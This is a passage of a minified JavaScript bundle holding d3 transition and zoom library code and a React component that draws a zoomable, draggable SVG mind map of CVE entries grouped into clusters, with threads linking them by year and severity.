if(t in a)return;S0(e,t,{name:n,index:s,group:r,on:b0,tween:x0,time:i.time,delay:i.delay,duration:i.duration,ease:i.ease,timer:null,state:qd})}function fo(e,n){var t=Qe(e,n);if(t.state>qd)throw new Error("too late; already scheduled");return t}function rn(e,n){var t=Qe(e,n);if(t.state>Ar)throw new Error("too late; already running");return t}function Qe(e,n){var t=e.__transition;if(!t||!(t=t[n]))throw new Error("transition not found");return t}function S0(e,n,t){var s=e.__transition,r;s[n]=t,t.timer=Yd(i,0,t.time);function i(c){t.state=Zc,t.timer.restart(a,t.delay,t.time),t.delay<=c&&a(c-t.delay)}function a(c){var u,d,h,v;if(t.state!==Zc)return o();for(u in s)if(v=s[u],v.name===t.name){if(v.state===Ar)return Qc(a);v.state===Jc?(v.state=Lr,v.timer.stop(),v.on.call("interrupt",e,e.__data__,v.index,v.group),delete s[u]):+u<n&&(v.state=Lr,v.timer.stop(),v.on.call("cancel",e,e.__data__,v.index,v.group),delete s[u])}if(Qc(function(){t.state===Ar&&(t.state=Jc,t.timer.restart(l,t.delay,t.time),l(c))}),t.state=ol,t.on.call("start",e,e.__data__,t.index,t.group),t.state===ol){for(t.state=Ar,r=new Array(h=t.tween.length),u=0,d=-1;u<h;++u)(v=t.tween[u].value.call(e,e.__data__,t.index,t.group))&&(r[++d]=v);r.length=d+1}}function l(c){for(var u=c<t.duration?t.ease.call(null,c/t.duration):(t.timer.restart(o),t.state=cl,1),d=-1,h=r.length;++d<h;)r[d].call(e,u);t.state===cl&&(t.on.call("end",e,e.__data__,t.index,t.group),o())}function o(){t.state=Lr,t.timer.stop(),delete s[n];for(var c in s)return;delete e.__transition}}function Nr(e,n){var t=e.__transition,s,r,i=!0,a;if(t){n=n==null?null:n+"";for(a in t){if((s=t[a]).name!==n){i=!1;continue}r=s.state>ol&&s.state<cl,s.state=Lr,s.timer.stop(),s.on.call(r?"interrupt":"cancel",e,e.__data__,s.index,s.group),delete t[a]}i&&delete e.__transition}}function _0(e){return this.each(function(){Nr(this,e)})}function E0(e,n){var t,s;return function(){var r=rn(this,e),i=r.tween;if(i!==t){s=t=i;for(var a=0,l=s.length;a<l;++a)if(s[a].name===n){s=s.slice(),s.splice(a,1);break}}r.tween=s}}function T0(e,n,t){var s,r;if(typeof t!="function")throw new Error;return function(){var i=rn(this,e),a=i.tween;if(a!==s){r=(s=a).slice();for(var l={name:n,value:t},o=0,c=r.length;o<c;++o)if(r[o].name===n){r[o]=l;break}o===c&&r.push(l)}i.tween=r}}function C0(e,n){var t=this._id;if(e+="",arguments.length<2){for(var s=Qe(this.node(),t).tween,r=0,i=s.length,a;r<i;++r)if((a=s[r]).name===e)return a.value;return null}return this.each((n==null?E0:T0)(t,e,n))}function mo(e,n,t){var s=e._id;return e.each(function(){var r=rn(this,s);(r.value||(r.value={}))[n]=t.apply(this,arguments)}),function(r){return Qe(r,s).value[n]}}function Xd(e,n){var t;return(typeof n=="number"?Sn:n instanceof js?Yc:(t=js(n))?(n=t,Yc):o0)(e,n)}function P0(e){return function(){this.removeAttribute(e)}}function A0(e){return function(){this.removeAttributeNS(e.space,e.local)}}function L0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttribute(e);return a===r?null:a===s?i:i=n(s=a,t)}}function N0(e,n,t){var s,r=t+"",i;return function(){var a=this.getAttributeNS(e.space,e.local);return a===r?null:a===s?i:i=n(s=a,t)}}function R0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttribute(e):(a=this.getAttribute(e),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function O0(e,n,t){var s,r,i;return function(){var a,l=t(this),o;return l==null?void this.removeAttributeNS(e.space,e.local):(a=this.getAttributeNS(e.space,e.local),o=l+"",a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l)))}}function M0(e,n){var t=Ti(e),s=t==="transform"?d0:Xd;return this.attrTween(e,typeof n=="function"?(t.local?O0:R0)(t,s,mo(this,"attr."+e,n)):n==null?(t.local?A0:P0)(t):(t.local?N0:L0)(t,s,n))}function I0(e,n){return function(t){this.setAttribute(e,n.call(this,t))}}function D0(e,n){return function(t){this.setAttributeNS(e.space,e.local,n.call(this,t))}}function z0(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&D0(e,i)),t}return r._value=n,r}function j0(e,n){var t,s;function r(){var i=n.apply(this,arguments);return i!==s&&(t=(s=i)&&I0(e,i)),t}return r._value=n,r}function B0(e,n){var t="attr."+e;if(arguments.length<2)return(t=this.tween(t))&&t._value;if(n==null)return this.tween(t,null);if(typeof n!="function")throw new Error;var s=Ti(e);return this.tween(t,(s.local?z0:j0)(s,n))}function F0(e,n){return function(){fo(this,e).delay=+n.apply(this,arguments)}}function U0(e,n){return n=+n,function(){fo(this,e).delay=n}}function H0(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?F0:U0)(n,e)):Qe(this.node(),n).delay}function V0(e,n){return function(){rn(this,e).duration=+n.apply(this,arguments)}}function W0(e,n){return n=+n,function(){rn(this,e).duration=n}}function $0(e){var n=this._id;return arguments.length?this.each((typeof e=="function"?V0:W0)(n,e)):Qe(this.node(),n).duration}function G0(e,n){if(typeof n!="function")throw new Error;return function(){rn(this,e).ease=n}}function Y0(e){var n=this._id;return arguments.length?this.each(G0(n,e)):Qe(this.node(),n).ease}function q0(e,n){return function(){var t=n.apply(this,arguments);if(typeof t!="function")throw new Error;rn(this,e).ease=t}}function X0(e){if(typeof e!="function")throw new Error;return this.each(q0(this._id,e))}function K0(e){typeof e!="function"&&(e=Ad(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new yn(s,this._parents,this._name,this._id)}function Q0(e){if(e._id!==this._id)throw new Error;for(var n=this._groups,t=e._groups,s=n.length,r=t.length,i=Math.min(s,r),a=new Array(s),l=0;l<i;++l)for(var o=n[l],c=t[l],u=o.length,d=a[l]=new Array(u),h,v=0;v<u;++v)(h=o[v]||c[v])&&(d[v]=h);for(;l<s;++l)a[l]=n[l];return new yn(a,this._parents,this._name,this._id)}function Z0(e){return(e+"").trim().split(/^|\s+/).every(function(n){var t=n.indexOf(".");return t>=0&&(n=n.slice(0,t)),!n||n==="start"})}function J0(e,n,t){var s,r,i=Z0(n)?fo:rn;return function(){var a=i(this,e),l=a.on;l!==s&&(r=(s=l).copy()).on(n,t),a.on=r}}function ew(e,n){var t=this._id;return arguments.length<2?Qe(this.node(),t).on.on(e):this.each(J0(t,e,n))}function nw(e){return function(){var n=this.parentNode;for(var t in this.__transition)if(+t!==e)return;n&&n.removeChild(this)}}function tw(){return this.on("end.remove",nw(this._id))}function sw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=co(e));for(var s=this._groups,r=s.length,i=new Array(r),a=0;a<r;++a)for(var l=s[a],o=l.length,c=i[a]=new Array(o),u,d,h=0;h<o;++h)(u=l[h])&&(d=e.call(u,u.__data__,h,l))&&("__data__"in u&&(d.__data__=u.__data__),c[h]=d,Pi(c[h],n,t,h,c,Qe(u,t)));return new yn(i,this._parents,n,t)}function rw(e){var n=this._name,t=this._id;typeof e!="function"&&(e=Pd(e));for(var s=this._groups,r=s.length,i=[],a=[],l=0;l<r;++l)for(var o=s[l],c=o.length,u,d=0;d<c;++d)if(u=o[d]){for(var h=e.call(u,u.__data__,d,o),v,k=Qe(u,t),x=0,A=h.length;x<A;++x)(v=h[x])&&Pi(v,n,t,x,h,k);i.push(h),a.push(u)}return new yn(i,a,n,t)}var iw=Ys.prototype.constructor;function aw(){return new iw(this._groups,this._parents)}function lw(e,n){var t,s,r;return function(){var i=Bt(this,e),a=(this.style.removeProperty(e),Bt(this,e));return i===a?null:i===t&&a===s?r:r=n(t=i,s=a)}}function Kd(e){return function(){this.style.removeProperty(e)}}function ow(e,n,t){var s,r=t+"",i;return function(){var a=Bt(this,e);return a===r?null:a===s?i:i=n(s=a,t)}}function cw(e,n,t){var s,r,i;return function(){var a=Bt(this,e),l=t(this),o=l+"";return l==null&&(o=l=(this.style.removeProperty(e),Bt(this,e))),a===o?null:a===s&&o===r?i:(r=o,i=n(s=a,l))}}function uw(e,n){var t,s,r,i="style."+n,a="end."+i,l;return function(){var o=rn(this,e),c=o.on,u=o.value[i]==null?l||(l=Kd(n)):void 0;(c!==t||r!==u)&&(s=(t=c).copy()).on(a,r=u),o.on=s}}function pw(e,n,t){var s=(e+="")=="transform"?p0:Xd;return n==null?this.styleTween(e,lw(e,s)).on("end.style."+e,Kd(e)):typeof n=="function"?this.styleTween(e,cw(e,s,mo(this,"style."+e,n))).each(uw(this._id,e)):this.styleTween(e,ow(e,s,n),t).on("end.style."+e,null)}function dw(e,n,t){return function(s){this.style.setProperty(e,n.call(this,s),t)}}function hw(e,n,t){var s,r;function i(){var a=n.apply(this,arguments);return a!==r&&(s=(r=a)&&dw(e,a,t)),s}return i._value=n,i}function fw(e,n,t){var s="style."+(e+="");if(arguments.length<2)return(s=this.tween(s))&&s._value;if(n==null)return this.tween(s,null);if(typeof n!="function")throw new Error;return this.tween(s,hw(e,n,t??""))}function mw(e){return function(){this.textContent=e}}function gw(e){return function(){var n=e(this);this.textContent=n??""}}function yw(e){return this.tween("text",typeof e=="function"?gw(mo(this,"text",e)):mw(e==null?"":e+""))}function vw(e){return function(n){this.textContent=e.call(this,n)}}function ww(e){var n,t;function s(){var r=e.apply(this,arguments);return r!==t&&(n=(t=r)&&vw(r)),n}return s._value=e,s}function kw(e){var n="text";if(arguments.length<1)return(n=this.tween(n))&&n._value;if(e==null)return this.tween(n,null);if(typeof e!="function")throw new Error;return this.tween(n,ww(e))}function bw(){for(var e=this._name,n=this._id,t=Qd(),s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)if(o=a[c]){var u=Qe(o,n);Pi(o,e,t,c,a,{time:u.time+u.delay+u.duration,delay:0,duration:u.duration,ease:u.ease})}return new yn(s,this._parents,e,t)}function xw(){var e,n,t=this,s=t._id,r=t.size();return new Promise(function(i,a){var l={value:a},o={value:function(){--r===0&&i()}};t.each(function(){var c=rn(this,s),u=c.on;u!==e&&(n=(e=u).copy(),n._.cancel.push(l),n._.interrupt.push(l),n._.end.push(o)),c.on=n}),r===0&&i()})}var Sw=0;function yn(e,n,t,s){this._groups=e,this._parents=n,this._name=t,this._id=s}function Qd(){return++Sw}var an=Ys.prototype;yn.prototype={constructor:yn,select:sw,selectAll:rw,selectChild:an.selectChild,selectChildren:an.selectChildren,filter:K0,merge:Q0,selection:aw,transition:bw,call:an.call,nodes:an.nodes,node:an.node,size:an.size,empty:an.empty,each:an.each,on:ew,attr:M0,attrTween:B0,style:pw,styleTween:fw,text:yw,textTween:kw,remove:tw,tween:C0,delay:H0,duration:$0,ease:Y0,easeVarying:X0,end:xw,[Symbol.iterator]:an[Symbol.iterator]};function _w(e){return((e*=2)<=1?e*e*e:(e-=2)*e*e+2)/2}var Ew={time:null,delay:0,duration:250,ease:_w};function Tw(e,n){for(var t;!(t=e.__transition)||!(t=t[n]);)if(!(e=e.parentNode))throw new Error(`transition ${n} not found`);return t}function Cw(e){var n,t;e instanceof yn?(n=e._id,e=e._name):(n=Qd(),(t=Ew).time=ho(),e=e==null?null:e+"");for(var s=this._groups,r=s.length,i=0;i<r;++i)for(var a=s[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&Pi(o,e,n,c,a,t||Tw(o,n));return new yn(s,this._parents,e,n)}Ys.prototype.interrupt=_0;Ys.prototype.transition=Cw;const mr=e=>()=>e;function Pw(e,{sourceEvent:n,target:t,transform:s,dispatch:r}){Object.defineProperties(this,{type:{value:e,enumerable:!0,configurable:!0},sourceEvent:{value:n,enumerable:!0,configurable:!0},target:{value:t,enumerable:!0,configurable:!0},transform:{value:s,enumerable:!0,configurable:!0},_:{value:r}})}function pn(e,n,t){this.k=e,this.x=n,this.y=t}pn.prototype={constructor:pn,scale:function(e){return e===1?this:new pn(this.k*e,this.x,this.y)},translate:function(e,n){return e===0&n===0?this:new pn(this.k,this.x+this.k*e,this.y+this.k*n)},apply:function(e){return[e[0]*this.k+this.x,e[1]*this.k+this.y]},applyX:function(e){return e*this.k+this.x},applyY:function(e){return e*this.k+this.y},invert:function(e){return[(e[0]-this.x)/this.k,(e[1]-this.y)/this.k]},invertX:function(e){return(e-this.x)/this.k},invertY:function(e){return(e-this.y)/this.k},rescaleX:function(e){return e.copy().domain(e.range().map(this.invertX,this).map(e.invert,e))},rescaleY:function(e){return e.copy().domain(e.range().map(this.invertY,this).map(e.invert,e))},toString:function(){return"translate("+this.x+","+this.y+") scale("+this.k+")"}};var go=new pn(1,0,0);pn.prototype;function ia(e){e.stopImmediatePropagation()}function ns(e){e.preventDefault(),e.stopImmediatePropagation()}function Aw(e){return(!e.ctrlKey||e.type==="wheel")&&!e.button}function Lw(){var e=this;return e instanceof SVGElement?(e=e.ownerSVGElement||e,e.hasAttribute("viewBox")?(e=e.viewBox.baseVal,[[e.x,e.y],[e.x+e.width,e.y+e.height]]):[[0,0],[e.width.baseVal.value,e.height.baseVal.value]]):[[0,0],[e.clientWidth,e.clientHeight]]}function eu(){return this.__zoom||go}function Nw(e){return-e.deltaY*(e.deltaMode===1?.05:e.deltaMode?1:.002)*(e.ctrlKey?10:1)}function Rw(){return navigator.maxTouchPoints||"ontouchstart"in this}function Ow(e,n,t){var s=e.invertX(n[0][0])-t[0][0],r=e.invertX(n[1][0])-t[1][0],i=e.invertY(n[0][1])-t[0][1],a=e.invertY(n[1][1])-t[1][1];return e.translate(r>s?(s+r)/2:Math.min(0,s)||Math.max(0,r),a>i?(i+a)/2:Math.min(0,i)||Math.max(0,a))}function Mw(){var e=Aw,n=Lw,t=Ow,s=Nw,r=Rw,i=[0,1/0],a=[[-1/0,-1/0],[1/0,1/0]],l=250,o=g0,c=oo("start","zoom","end"),u,d,h,v=500,k=150,x=0,A=10;function p(w){w.property("__zoom",eu).on("wheel.zoom",b,{passive:!1}).on("mousedown.zoom",M).on("dblclick.zoom",N).filter(r).on("touchstart.zoom",F).on("touchmove.zoom",B).on("touchend.zoom touchcancel.zoom",W).style("-webkit-tap-highlight-color","rgba(0,0,0,0)")}p.transform=function(w,O,E,D){var _=w.selection?w.selection():w;_.property("__zoom",eu),w!==_?T(w,O,E,D):_.interrupt().each(function(){I(this,arguments).event(D).start().zoom(null,typeof O=="function"?O.apply(this,arguments):O).end()})},p.scaleBy=function(w,O,E,D){p.scaleTo(w,function(){var _=this.__zoom.k,L=typeof O=="function"?O.apply(this,arguments):O;return _*L},E,D)},p.scaleTo=function(w,O,E,D){p.transform(w,function(){var _=n.apply(this,arguments),L=this.__zoom,R=E==null?S(_):typeof E=="function"?E.apply(this,arguments):E,j=L.invert(R),U=typeof O=="function"?O.apply(this,arguments):O;return t(m(f(L,U),R,j),_,a)},E,D)},p.translateBy=function(w,O,E,D){p.transform(w,function(){return t(this.__zoom.translate(typeof O=="function"?O.apply(this,arguments):O,typeof E=="function"?E.apply(this,arguments):E),n.apply(this,arguments),a)},null,D)},p.translateTo=function(w,O,E,D,_){p.transform(w,function(){var L=n.apply(this,arguments),R=this.__zoom,j=D==null?S(L):typeof D=="function"?D.apply(this,arguments):D;return t(go.translate(j[0],j[1]).scale(R.k).translate(typeof O=="function"?-O.apply(this,arguments):-O,typeof E=="function"?-E.apply(this,arguments):-E),L,a)},D,_)};function f(w,O){return O=Math.max(i[0],Math.min(i[1],O)),O===w.k?w:new pn(O,w.x,w.y)}function m(w,O,E){var D=O[0]-E[0]*w.k,_=O[1]-E[1]*w.k;return D===w.x&&_===w.y?w:new pn(w.k,D,_)}function S(w){return[(+w[0][0]+ +w[1][0])/2,(+w[0][1]+ +w[1][1])/2]}function T(w,O,E,D){w.on("start.zoom",function(){I(this,arguments).event(D).start()}).on("interrupt.zoom end.zoom",function(){I(this,arguments).event(D).end()}).tween("zoom",function(){var _=this,L=arguments,R=I(_,L).event(D),j=n.apply(_,L),U=E==null?S(j):typeof E=="function"?E.apply(_,L):E,ie=Math.max(j[1][0]-j[0][0],j[1][1]-j[0][1]),$=_.__zoom,ae=typeof O=="function"?O.apply(_,L):O,te=o($.invert(U).concat(ie/$.k),ae.invert(U).concat(ie/ae.k));return function(le){if(le===1)le=ae;else{var He=te(le),$t=ie/He[2];le=new pn($t,U[0]-He[0]*$t,U[1]-He[1]*$t)}R.zoom(null,le)}})}function I(w,O,E){return!E&&w.__zooming||new g(w,O)}function g(w,O){this.that=w,this.args=O,this.active=0,this.sourceEvent=null,this.extent=n.apply(w,O),this.taps=0}g.prototype={event:function(w){return w&&(this.sourceEvent=w),this},start:function(){return++this.active===1&&(this.that.__zooming=this,this.emit("start")),this},zoom:function(w,O){return this.mouse&&w!=="mouse"&&(this.mouse[1]=O.invert(this.mouse[0])),this.touch0&&w!=="touch"&&(this.touch0[1]=O.invert(this.touch0[0])),this.touch1&&w!=="touch"&&(this.touch1[1]=O.invert(this.touch1[0])),this.that.__zoom=O,this.emit("zoom"),this},end:function(){return--this.active===0&&(delete this.that.__zooming,this.emit("end")),this},emit:function(w){var O=Tn(this.that).datum();c.call(w,this.that,new Pw(w,{sourceEvent:this.sourceEvent,target:p,transform:this.that.__zoom,dispatch:c}),O)}};function b(w,...O){if(!e.apply(this,arguments))return;var E=I(this,O).event(w),D=this.__zoom,_=Math.max(i[0],Math.min(i[1],D.k*Math.pow(2,s.apply(this,arguments)))),L=$n(w);if(E.wheel)(E.mouse[0][0]!==L[0]||E.mouse[0][1]!==L[1])&&(E.mouse[1]=D.invert(E.mouse[0]=L)),clearTimeout(E.wheel);else{if(D.k===_)return;E.mouse=[L,D.invert(L)],Nr(this),E.start()}ns(w),E.wheel=setTimeout(R,k),E.zoom("mouse",t(m(f(D,_),E.mouse[0],E.mouse[1]),E.extent,a));function R(){E.wheel=null,E.end()}}function M(w,...O){if(h||!e.apply(this,arguments))return;var E=w.currentTarget,D=I(this,O,!0).event(w),_=Tn(w.view).on("mousemove.zoom",U,!0).on("mouseup.zoom",ie,!0),L=$n(w,E),R=w.clientX,j=w.clientY;Vv(w.view),ia(w),D.mouse=[L,this.__zoom.invert(L)],Nr(this),D.start();function U($){if(ns($),!D.moved){var ae=$.clientX-R,te=$.clientY-j;D.moved=ae*ae+te*te>x}D.event($).zoom("mouse",t(m(D.that.__zoom,D.mouse[0]=$n($,E),D.mouse[1]),D.extent,a))}function ie($){_.on("mousemove.zoom mouseup.zoom",null),Wv($.view,D.moved),ns($),D.event($).end()}}function N(w,...O){if(e.apply(this,arguments)){var E=this.__zoom,D=$n(w.changedTouches?w.changedTouches[0]:w,this),_=E.invert(D),L=E.k*(w.shiftKey?.5:2),R=t(m(f(E,L),D,_),n.apply(this,O),a);ns(w),l>0?Tn(this).transition().duration(l).call(T,R,D,w):Tn(this).call(p.transform,R,D,w)}}function F(w,...O){if(e.apply(this,arguments)){var E=w.touches,D=E.length,_=I(this,O,w.changedTouches.length===D).event(w),L,R,j,U;for(ia(w),R=0;R<D;++R)j=E[R],U=$n(j,this),U=[U,this.__zoom.invert(U),j.identifier],_.touch0?!_.touch1&&_.touch0[2]!==U[2]&&(_.touch1=U,_.taps=0):(_.touch0=U,L=!0,_.taps=1+!!u);u&&(u=clearTimeout(u)),L&&(_.taps<2&&(d=U[0],u=setTimeout(function(){u=null},v)),Nr(this),_.start())}}function B(w,...O){if(this.__zooming){var E=I(this,O).event(w),D=w.changedTouches,_=D.length,L,R,j,U;for(ns(w),L=0;L<_;++L)R=D[L],j=$n(R,this),E.touch0&&E.touch0[2]===R.identifier?E.touch0[0]=j:E.touch1&&E.touch1[2]===R.identifier&&(E.touch1[0]=j);if(R=E.that.__zoom,E.touch1){var ie=E.touch0[0],$=E.touch0[1],ae=E.touch1[0],te=E.touch1[1],le=(le=ae[0]-ie[0])*le+(le=ae[1]-ie[1])*le,He=(He=te[0]-$[0])*He+(He=te[1]-$[1])*He;R=f(R,Math.sqrt(le/He)),j=[(ie[0]+ae[0])/2,(ie[1]+ae[1])/2],U=[($[0]+te[0])/2,($[1]+te[1])/2]}else if(E.touch0)j=E.touch0[0],U=E.touch0[1];else return;E.zoom("touch",t(m(R,j,U),E.extent,a))}}function W(w,...O){if(this.__zooming){var E=I(this,O).event(w),D=w.changedTouches,_=D.length,L,R;for(ia(w),h&&clearTimeout(h),h=setTimeout(function(){h=null},v),L=0;L<_;++L)R=D[L],E.touch0&&E.touch0[2]===R.identifier?delete E.touch0:E.touch1&&E.touch1[2]===R.identifier&&delete E.touch1;if(E.touch1&&!E.touch0&&(E.touch0=E.touch1,delete E.touch1),E.touch0)E.touch0[1]=this.__zoom.invert(E.touch0[0]);else if(E.end(),E.taps===2&&(R=$n(R,this),Math.hypot(d[0]-R[0],d[1]-R[1])<A)){var j=Tn(this).on("dblclick.zoom");j&&j.apply(this,arguments)}}}return p.wheelDelta=function(w){return arguments.length?(s=typeof w=="function"?w:mr(+w),p):s},p.filter=function(w){return arguments.length?(e=typeof w=="function"?w:mr(!!w),p):e},p.touchable=function(w){return arguments.length?(r=typeof w=="function"?w:mr(!!w),p):r},p.extent=function(w){return arguments.length?(n=typeof w=="function"?w:mr([[+w[0][0],+w[0][1]],[+w[1][0],+w[1][1]]]),p):n},p.scaleExtent=function(w){return arguments.length?(i[0]=+w[0],i[1]=+w[1],p):[i[0],i[1]]},p.translateExtent=function(w){return arguments.length?(a[0][0]=+w[0][0],a[1][0]=+w[1][0],a[0][1]=+w[0][1],a[1][1]=+w[1][1],p):[[a[0][0],a[0][1]],[a[1][0],a[1][1]]]},p.constrain=function(w){return arguments.length?(t=w,p):t},p.duration=function(w){return arguments.length?(l=+w,p):l},p.interpolate=function(w){return arguments.length?(o=w,p):o},p.on=function(){var w=c.on.apply(c,arguments);return w===c?p:w},p.clickDistance=function(w){return arguments.length?(x=(w=+w)*w,p):Math.sqrt(x)},p.tapDistance=function(w){return arguments.length?(A=+w,p):A},p}const Iw={cluster:"#c0c0c0",cve:"#d5d5d5"};function Dw({data:e,onSelectCve:n,highlightId:t,hoveredId:s,onHover:r,onFocusPath:i}){const a=C.useRef(null),[l,o]=C.useState(go),c=C.useRef({id:null,offset:[0,0],pointerId:null,mode:"node",base:null}),[u,d]=C.useState({}),h=C.useMemo(()=>{var O;if(!((O=e==null?void 0:e.children)!=null&&O.length))return{nodes:[],links:[],rooms:[],center:{x:480,y:320},width:960,height:640};const g=960,b=640,M={x:g/2,y:b/2},N=e.children,F=Math.min(g,b)/2-120,B=[],W=[],w=[];return N.forEach((E,D)=>{const _=D/N.length*Math.PI*2,L=M.x+Math.cos(_)*F,R=M.y+Math.sin(_)*F,j=E.id||E.name||`group-${D}`,U={id:j,name:E.name,type:"cluster",x:L,y:R,info:E};B.push(U);const ie=E.children||[],$=80+Math.min(60,ie.length*2);w.push({id:`${j}-room`,anchor:j,x:L,y:R,r:$+26,glyphR:$+12}),ie.forEach((ae,te)=>{const le=te/ie.length*Math.PI*2,He=L+Math.cos(le)*$,$t=R+Math.sin(le)*$,Ai=ae.id||`${j}-cve-${te}`,Zd={id:Ai,name:ae.name||Ai,type:"cve",x:He,y:$t,info:ae};B.push(Zd),W.push({source:j,target:Ai})})}),{nodes:B,links:W,rooms:w,center:M,width:g,height:b}},[e]);C.useEffect(()=>{const g={};h.nodes.forEach(b=>{g[b.id]={x:b.x,y:b.y}}),d(g)},[h]);const v=C.useMemo(()=>h.nodes.map(g=>{const b=u[g.id];return b?{...g,x:b.x,y:b.y}:g}),[h.nodes,u]),k=C.useMemo(()=>{const g=new Map;return v.forEach(b=>g.set(b.id,b)),g},[v]),x=g=>{const b=new Map;v.filter(F=>F.type==="cve").forEach(F=>{const B=g(F);B&&(b.has(B)||b.set(B,[]),b.get(B).push(F))});const M=[],N=h.center||{x:0,y:0};return b.forEach(F=>{if(F.length<2)return;const B=[...F].sort((w,O)=>{const E=Math.atan2(w.y-N.y,w.x-N.x),D=Math.atan2(O.y-N.y,O.x-N.x);return E-D}),W=Math.min(B.length,8);for(let w=0;w<W-1;w++){const O=B[w],E=B[w+1];M.push({source:O.id,target:E.id,wiggle:22+Math.random()*26,dash:12+Math.random()*10})}B.length>3&&M.push({source:B[0].id,target:B[B.length-1].id,wiggle:18+Math.random()*20,dash:10+Math.random()*10})}),M},A=C.useMemo(()=>x(g=>{var b;return((b=g.info)==null?void 0:b.year)||"Unknown"}),[v,h.center]),p=C.useMemo(()=>x(g=>{var b;return((b=g.info)==null?void 0:b.severity)||"Info"}),[v,h.center]);C.useEffect(()=>{if(!t||!e)return;const g=[],b=(M,N)=>{const F=M.id||M.name,B=[...N,M.name];if((F==null?void 0:F.toLowerCase())===t.toLowerCase())return g.push(...B),!0;if(!M.children)return!1;for(const W of M.children)if(b(W,B))return!0;return!1};b(e,[]),g.length&&(i==null||i(g))},[t,e,i]),C.useEffect(()=>{const g=Tn(a.current),b=Mw().scaleExtent([.6,2.5]).on("zoom",M=>o(M.transform));return g.call(b),()=>g.on(".zoom",null)},[]);const f=g=>{g.type==="cve"&&(n==null||n(g.info))},m=(g,b)=>{if(!a.current)return;const M=a.current.getBoundingClientRect(),[N,F]=l.invert([b.clientX-M.left,b.clientY-M.top]),B=k.get(g.id)||g;c.current={id:g.id,pointerId:b.pointerId,offset:[N-B.x,F-B.y],mode:"node",base:null},a.current.setPointerCapture(b.pointerId)},S=g=>{if(!a.current)return;const b=a.current.getBoundingClientRect(),[M,N]=l.invert([g.clientX-b.left,g.clientY-b.top]),F={};v.forEach(B=>{F[B.id]={x:B.x,y:B.y}}),c.current={id:"__all__",pointerId:g.pointerId,offset:[M,N],mode:"all",base:F},a.current.setPointerCapture(g.pointerId)},T=g=>{if(!(!c.current.id||!a.current)){try{a.current.releasePointerCapture(c.current.pointerId)}catch{}c.current={id:null,offset:[0,0],pointerId:null}}},I=g=>{if(!c.current.id||!a.current)return;const b=a.current.getBoundingClientRect(),[M,N]=l.invert([g.clientX-b.left,g.clientY-b.top]);if(c.current.mode==="all"&&c.current.base){const[E,D]=c.current.offset,_=M-E,L=N-D;d(()=>{const R={};return Object.entries(c.current.base).forEach(([j,U])=>{R[j]={x:U.x+_,y:U.y+L}}),R});return}const[F,B]=c.current.offset,W=M-F,w=N-B,O=c.current.id;d(E=>({...E,[O]:{x:W,y:w}}))};return y.jsx("div",{className:"cve-mindmap",children:y.jsxs("svg",{ref:a,viewBox:"0 0 960 640",role:"presentation",onPointerDown:g=>{g.altKey&&S(g)},onPointerMove:I,onPointerUp:T,onPointerCancel:T,onPointerLeave:T,children:[y.jsx("defs",{children:y.jsxs("filter",{id:"glow",children:[y.jsx("feGaussianBlur",{stdDeviation:"2.5",result:"coloredBlur"}),y.jsxs("feMerge",{children:[y.jsx("feMergeNode",{in:"coloredBlur"}),y.jsx("feMergeNode",{in:"SourceGraphic"})]})]})}),y.jsxs("g",{transform:`translate(${l.x},${l.y}) scale(${l.k})`,children:[h.rooms.map(g=>{const b=k.get(g.anchor||g.id),M=(b==null?void 0:b.x)??g.x,N=(b==null?void 0:b.y)??g.y;return y.jsxs("g",{className:"mindmap-room",children:[y.jsx("circle",{cx:M,cy:N,r:g.r,fill:"rgba(255,255,255,0.02)",stroke:"rgba(200,200,200,0.08)",strokeWidth:"1.2"}),y.jsx("g",{className:"glyph-ring","transform-origin":`${M} ${N}`,children:Array.from({length:12}).map((F,B)=>{const W=B/12*Math.PI*2,w=g.glyphR,O=w+8,E=M+Math.cos(W)*w,D=N+Math.sin(W)*w,_=M+Math.cos(W)*O,L=N+Math.sin(W)*O;return y.jsx("line",{x1:E,y1:D,x2:_,y2:L,stroke:"rgba(200,200,200,0.4)",strokeWidth:B%3===0?1.3:.7,opacity:.7},`${g.id}-tick-${B}`)})})]},g.id)}),A.map((g,b)=>{const M=k.get(g.source),N=k.get(g.target);if(!M||!N)return null;const F=(M.x+N.x)/2,B=(M.y+N.y)/2,W=N.y-M.y,w=M.x-N.x,O=Math.hypot(W,w)||1,E=W/O*g.wiggle,D=w/O*g.wiggle,_=F+E,L=B+D,R=s&&(s===g.source||s===g.target);return y.jsx("path",{d:`M ${M.x} ${M.y} Q ${_} ${L} ${N.x} ${N.y}`,className:`memory-thread${R?" active":""}`,strokeDasharray:`${g.dash} ${g.dash*1.6}`,style:{animationDelay:`${b*120}ms`}},`thread-year-${b}`)}),p.map((g,b)=>{const M=k.get(g.source),N=k.get(g.target);if(!M||!N)return null;const F=(M.x+N.x)/2,B=(M.y+N.y)/2,W=N.y-M.y,w=M.x-N.x,O=Math.hypot(W,w)||1,E=W/O*g.wiggle*.6,D=w/O*g.wiggle*.6,_=F+E,L=B+D,R=s&&(s===g.source||s===g.target);return y.jsx("path",{d:`M ${M.x} ${M.y} Q ${_} ${L} ${N.x} ${N.y}`,className:`memory-thread severity${R?" active":""}`,strokeDasharray:`${g.dash} ${g.dash*1.8}`,style:{animationDelay:`${b*140}ms`}},`thread-sev-${b}`)}),h.links.map(g=>{var b,M,N,F;return y.jsx("line",{x1:(b=k.get(g.source))==null?void 0:b.x,y1:(M=k.get(g.source))==null?void 0:M.y,x2:(N=k.get(g.target))==null?void 0:N.x,y2:(F=k.get(g.target))==null?void 0:F.y,stroke:"rgba(180, 180, 180, 0.25)",strokeWidth:s&&(g.source===s||g.target===s)?2.2:1},`${g.source}-${g.target}`)}),v.map(g=>{var F;const b=g.type==="cve"?11:18,M=t&&((F=g.id)==null?void 0:F.toLowerCase())===t.toLowerCase(),N=Iw[g.type]||"#d5d5d5";return y.jsxs("g",{transform:`translate(${g.x},${g.y})`,className:`mindmap-node 